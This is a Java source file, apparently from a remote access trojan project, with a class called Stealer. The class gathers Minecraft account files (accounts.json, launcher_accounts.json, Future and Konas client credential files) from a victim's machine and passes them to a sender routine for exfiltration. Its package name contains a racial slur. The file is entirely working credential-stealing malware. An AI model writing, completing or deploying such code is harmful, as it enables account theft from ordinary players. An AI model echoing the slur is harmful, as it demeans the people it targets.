package me.nigger.rat.payload.impl;

import me.nigger.rat.payload.api.Payload;
import me.nigger.rat.payload.api.Sender;
import me.nigger.rat.util.FileUtil;

import java.util.Arrays;
import java.util.List;
import java.util.Optional;


public final class Stealer implements Payload
{
    @Override
    public void execute() throws Exception
    {
       List<String> files = Arrays.asList(System.getenv("APPDATA") + "\\.minecraft\\" + "accounts.json",
               System.getProperty("user.home") + "\\Future\\accounts.txt",
               System.getenv("APPDATA") + "\\.minecraft\\" + "launcher_accounts.json",
               System.getenv("APPDATA") + "\\.minecraft\\" + "KonasConfig.json");

        files.stream().map(FileUtil::getFile).filter(Optional::isPresent).forEach(Sender::send);
    }
}
